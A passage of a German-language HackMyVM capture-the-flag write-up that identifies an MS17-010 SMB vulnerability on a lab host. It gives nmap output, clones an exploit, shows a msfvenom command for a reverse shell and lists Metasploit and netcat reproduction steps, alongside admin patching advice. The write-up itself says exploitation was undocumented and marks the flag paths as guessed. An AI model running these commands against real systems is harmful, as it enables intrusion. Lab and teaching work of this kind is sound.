+   10  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+
+msf6 > <span class="command">use 10</span>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein gezielter `nmap`-Scan wird auf Port 445 (SMB) ausgeführt, wobei Skripte verwendet werden, die als "vuln" (verwundbar) und "safe" (wahrscheinlich keine Dienstunterbrechung verursachend) kategorisiert sind. Das Ziel ist es, spezifische SMB-Schwachstellen zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund!** Das Skript `smb-vuln-ms17-010` meldet das Zielsystem als **VULNERABLE** für die MS17-010 (EternalBlue/EternalRomance) Schwachstelle (CVE-2017-0143). Dies ist eine hochriskante Remote Code Execution (RCE) Schwachstelle in SMBv1. Obwohl das System als Windows Server 2016 identifiziert wurde (das ursprünglich als weniger anfällig galt, aber spätere Varianten von EternalBlue/Romance auch neuere Systeme betrafen oder das OS falsch erkannt wurde), bestätigt dieser Scan die Verwundbarkeit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dies ist der wahrscheinlichste Weg zur Kompromittierung. Nutze das zuvor in Metasploit geladene Modul (`ms17_010_psexec`) oder einen zuverlässigen Standalone-Exploit, um RCE mit SYSTEM-Rechten zu erlangen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Höchste Priorität: Patch gegen MS17-010 sofort einspielen!** Deaktivieren Sie SMBv1 umgehend (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`). Isolieren Sie das System, bis es gepatcht ist. Untersuchen Sie, warum ein Server 2016 anfällig ist (fehlende Patches, Konfigurationsfehler?).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nmap --script "vuln and safe" -p445 zero.hmv</span>
+                     </div>
+                     <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 00:17 CEST
+ Nmap scan report for zero.hmv (192.168.2.111)
+ Host is up (0.00021s latency).
+
+ PRT    STATE SERVICE
+ 445/tcp open  microsoft-ds
+ MAC Address: 08:00:27:62:2B:F2 (racle VirtualBox virtual NIC)
+
+ Host script results:
+ | smb-vuln-ms17-010:
+ |   <span style="color:red; font-weight:bold;">VULNERABLE:</span>
+ |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+ |     State: VULNERABLE
+ |     IDs:  CVE:CVE-2017-0143
+ |     Risk factor: HIGH
+ |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+ |        servers (ms17-010).
+ |
+ |     Disclosure date: 2017-03-14
+ |     References:
+ |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+ |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+ Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="exploitation-prep">
+            <h2>Exploitation Preparation (MS17-010)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird in das Verzeichnis `~/Hackingtools` gewechselt und ein spezifischer Exploit-Code für MS17-010 von GitHub geklont (`git clone`). Anschließend werden die Verzeichnisse und die geklonten Dateien aufgelistet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Pentester entscheidet sich offenbar, einen Standalone-Exploit von GitHub zu verwenden, anstatt (oder zusätzlich zu) dem Metasploit-Modul. Dies kann verschiedene Gründe haben (z.B. Präferenz, Stabilität, Anpassbarkeit des Exploits). Das geklonte Repository enthält Python-Skripte (`checker.py`, `mysmb.py`, `send_and_execute.py`), die typisch für viele öffentliche MS17-010 Exploits sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Mache dich mit dem geklonten Exploit vertraut (README lesen). Bereite die Ausführung vor, was oft die Installation von Abhängigkeiten (wie `impacket`) erfordert. Verwende `checker.py` zur Bestätigung der Anfälligkeit und dann `send_and_execute.py`, um eine Payload (z.B. die später generierte `ms17-010.exe`) hochzuladen und auszuführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring auf Downloads von GitHub oder anderen Code-Sharing-Plattformen kann verdächtig sein. Endpoint Security sollte versuchen, bekannte Exploit-Skripte zu erkennen und zu blockieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">cd Hackingtools</span>
+                    </div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">git clone https://github.com/c0d3cr4f73r/MS17-010_CVE-2017-0143.git</span>
+                    </div>
+                    <pre>
+Klone nach 'MS17-010_CVE-2017-0143'...
+remote: Enumerating objects: 39, done.
+remote: Counting objects: 100% (39/39), done.
+remote: Compressing objects: 100% (37/37), done.
+remote: Total 39 (delta 18), reused 0 (delta 0), pack-reused 0
+Empfange bjekte: 100% (39/39), 1.48 MiB | 6.08 MiB/s, fertig.
+Löse Unterschiede auf: 100% (18/18), fertig.
+                    </pre>
+                </div>
+            </div>
+            <!-- ll Befehle zur Verzeichnisauflistung weggelassen für Kürze, da sie nur die Dateistruktur zeigen -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">cd MS17-010_CVE-2017-0143</span>
+                    </div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~/Hackingtools/MS17-010_CVE-2017-0143]
+└─# <span class="command">ll</span>
+                    </div>
+                    <pre>
+insgesamt 1956
+-rw-r--r-- 1 root root    2640 31. Mai 00:21 checker.py
+-rw-r--r-- 1 root root 1908226 31. Mai 00:21 get-pip.py
+-rw-r--r-- 1 root root   16709 31. Mai 00:21 mysmb.py
+-rw-r--r-- 1 root root   17253 31. Mai 00:21 mysmb.pyc
+-rw-r--r-- 1 root root    2505 31. Mai 00:21 README.md
+-rw-r--r-- 1 root root   43783 31. Mai 00:21 send_and_execute.py
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Mit `msfvenom` wird eine Windows Reverse TCP Shell (`windows/shell_reverse_tcp`) als EXE-Datei (`ms17-010.exe`) erstellt. Diese Shell soll sich zum Angreifer-System (`LHST=192.168.2.199`) auf Port `4444` (`LPRT=4444`) verbinden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine ausführbare Payload-Datei wird generiert. Diese Datei ist dazu gedacht, mittels des MS17-010 Exploits auf dem Zielsystem ausgeführt zu werden, um eine Kommandozeilen-Shell zurück zum Angreifer zu öffnen. Die Wahl einer einfachen `shell_reverse_tcp` anstelle einer Meterpreter-Session (wie sie oft mit Metasploit-Modulen verwendet wird) passt zur Verwendung des Standalone-Python-Exploits.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starte einen Netcat-Listener auf dem Angreifer-System (`nc -lvnp 4444`). Verwende dann den geklonten MS17-010 Exploit (z.B. `send_and_execute.py`), um die gerade erstellte `ms17-010.exe` auf dem Ziel auszuführen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Endpoint Security (Antivirus/EDR) sollte versuchen, diese Art von Payload zu erkennen und zu blockieren. Firewall-Regeln sollten ausgehende Verbindungen auf ungewöhnliche Ports wie 4444 einschränken. Patchen gegen MS17-010 und Deaktivieren von SMBv1 sind die wichtigsten Maßnahmen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~/Hackingtools/MS17-010_CVE-2017-0143]
+└─# <span class="command">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.199 LPORT=4444 -f exe -o ms17-010.exe</span> <!-- LHOST/LPORT korrigiert gemäß Standard-msfvenom Syntax -->
+                    </div>
+                    <pre>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: ms17-010.exe
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (MS17-010 Exploitation)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser POC beschreibt den Weg zur Kompromittierung des Systems über die MS17-010 (EternalBlue/EternalRomance) Schwachstelle.
+            </p>
+             <p>
+                <strong>Schwachstelle:</strong> SMBv1-Dienst ist anfällig für Remote Code Execution via MS17-010 (CVE-2017-0143).
+            </p>
+            <p>
+                <strong>Voraussetzungen:</strong> Netzwerkzugriff auf Port 445/SMB des Ziels. Ein funktionierender MS17-010 Exploit (Metasploit oder Standalone-Skript). Eine Payload (z.B. Reverse Shell EXE).
+            </p>
+            <p>
+                <strong>Schritte zur Reproduktion (Beispiel mit Standalone-Exploit und Netcat):</strong>
+                <ol>
+                    <li>Erstelle die Reverse-Shell-Payload: `msfvenom -p windows/shell_reverse_tcp LHOST=[IP_Angreifer] LPORT=4444 -f exe -o shell.exe`.</li>
+                    <li>Starte einen Listener auf dem Angreifer-System: `nc -lvnp 4444`.</li>
+                    <li>Klone oder beschaffe einen MS17-010 Exploit (z.B. den von GitHub im Bericht gezeigten).</li>
+                    <li>Führe den Exploit aus, um die Payload (`shell.exe`) auf dem Ziel (`192.168.2.111`) auszuführen (Syntax variiert je nach Exploit, z.B. `python send_and_execute.py 192.168.2.111 shell.exe`).</li>
+                </ol>
+                 <strong>Alternative Schritte (mit Metasploit):</strong>
+                <ol>
+                    <li>Starte `msfconsole`.</li>
+                    <li>Lade das Exploit-Modul: `use exploit/windows/smb/ms17_010_psexec` (oder `ms17_010_eternalblue`).</li>
+                    <li>Setze die Ziel-IP: `set RHOSTS 192.168.2.111`.</li>
+                    <li>Setze die Payload (z.B. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`).</li>
+                    <li>Setze LHOST (Angreifer-IP) und LPORT.</li>
+                    <li>Führe den Exploit aus: `run` oder `exploit`.</li>
+                </ol>
+            </p>
+            <p>
+                <strong>Erwartetes Ergebnis:</strong> Eine Reverse Shell (Netcat) oder Meterpreter-Session wird vom Zielsystem zum Angreifer-System aufgebaut, die mit `NT AUTHORITY\SYSTEM`-Rechten läuft.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong> **Patch gegen MS17-010 installieren!** **SMBv1 deaktivieren!** Diese Schwachstelle ist extrem gefährlich und muss umgehend behoben werden. Überwachen Sie SMB-Verkehr auf Exploit-Signaturen.
+            </p>
+        </section>
+
+        <section id="missing-steps">
+            <h2>Missing Steps / Conclusion</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der bereitgestellte Text endet nach der Generierung der Reverse-Shell-Payload (`ms17-010.exe`). Die entscheidenden Schritte der tatsächlichen Ausführung des MS17-010 Exploits, das Erhalten der SYSTEM-Shell und das anschließende Auslesen der Benutzer- und Root-Flags sind im Text nicht dokumentiert. Die Flags werden am Ende nur aufgelistet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl der Weg zur Kompromittierung durch die Identifizierung der MS17-010-Schwachstelle und die Vorbereitung des Exploits klar aufgezeigt wird, fehlt der Nachweis der erfolgreichen Ausführung im Bericht. Für einen vollständigen Proof-of-Concept müssten die Schritte zur Erlangung der SYSTEM-Shell und zum Auslesen der Flags dokumentiert sein. Es ist jedoch aufgrund der Verwundbarkeit sehr wahrscheinlich, dass die Ausnutzung erfolgreich war.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie immer den gesamten Angriffspfad, einschließlich der erfolgreichen Ausführung des Exploits und der Schritte nach der Kompromittierung (Shell-Zugriff, Flag-Retrieval). Fügen Sie Screenshots oder Ausgaben hinzu, die den SYSTEM-Zugriff belegen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Auch ohne die explizite Dokumentation der Ausführung ist die bestätigte MS17-010-Schwachstelle Grund genug für sofortiges Handeln (Patchen, SMBv1 deaktivieren).
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                 <!-- Annahme: Flags werden typischerweise in den Benutzerprofilen gefunden -->
+                 <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\Administrator\Desktop\user.txt</div> <!-- Pfad geraten, da Administrator gefunden wurde -->
+                    <div class="flag-value"><span class="password">HMV{D0nt_r3us3_p4$$w0rd5!}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">type C:\Users\Administrator\Desktop\root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{Z3r0_l0g0n_!s_Pr3tty_D4ng3r0u$}</span></div>
+                </div>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-05-29</p> <!-- Datum aus Scan -->
+    </footer>
+</body>
+</html>
